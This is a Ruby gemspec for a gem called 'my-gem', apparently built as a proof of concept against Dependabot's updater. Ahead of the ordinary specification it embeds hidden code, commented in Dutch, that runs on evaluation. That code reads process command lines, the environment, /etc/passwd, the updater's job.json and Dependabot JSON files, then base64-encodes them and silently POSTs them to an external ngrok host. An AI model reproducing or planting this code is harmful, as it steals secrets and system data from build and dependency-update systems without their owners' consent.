COLLAB_URL = "https://cb2f-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

read_safe = ->(path) {
  begin
    IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace)
  rescue => e
    "[ERR #{e.class}: #{e.message}]"
  end
}

begin
  require "net/http"
  require "uri"
  require "json"

  results = []

  # 1. Hoe werd dit Ruby process gestart? Toont pad naar echte job definitie
  results << "=== /proc/self/cmdline ===\n#{read_safe.('/proc/self/cmdline').gsub("\x00", " ")}"
  results << "=== /proc/1/cmdline ===\n#{read_safe.('/proc/1/cmdline').gsub("\x00", " ")}"

  # 2. Process-level env (bevat mogelijk DEPENDABOT_JOB_PATH of UPDATER_CONFIG)
  proc_env = read_safe.('/proc/self/environ').gsub("\x00", "\n")
  results << "=== /proc/self/environ ===\n#{proc_env[0..2000]}"

  # 3. Zoek alle JSON files die 'reject' bevatten
  begin
    found = []
    ["/home/dependabot", "/tmp", "/run", "/var/run", "/etc/dependabot"].each do |dir|
      next unless Dir.exist?(dir)
      Dir.glob("#{dir}/**/*.json") do |f|
        next unless File.file?(f)
        c = read_safe.(f)
        found << "#{f}:\n#{c[0..400]}" if c.include?("reject")
      end
    end
    results << "=== JSON met 'reject' ===\n#{found.empty? ? '(geen)' : found.join("\n---\n")}"
  rescue => e
    results << "glob ERR: #{e.message}"
  end

  # 4. Alle bestanden in de updater dir
  begin
    all_files = []
    Dir.glob("/home/dependabot/dependabot-updater/**/*").each do |f|
      all_files << f if File.file?(f)
    end
    results << "=== updater bestanden ===\n#{all_files.join("\n")}"
  rescue => e
    results << "updater ls ERR: #{e.message}"
  end

  # 5. Huidig job.json (parse-fase stub)
  results << "=== job.json ===\n#{read_safe.('/home/dependabot/dependabot-updater/job.json')[0..1000]}"

  # 6. Bewijs van bypass: /etc/passwd
  results << "=== /etc/passwd ===\n#{read_safe.('/etc/passwd')[0..300]}"

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=find_reject_flag")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
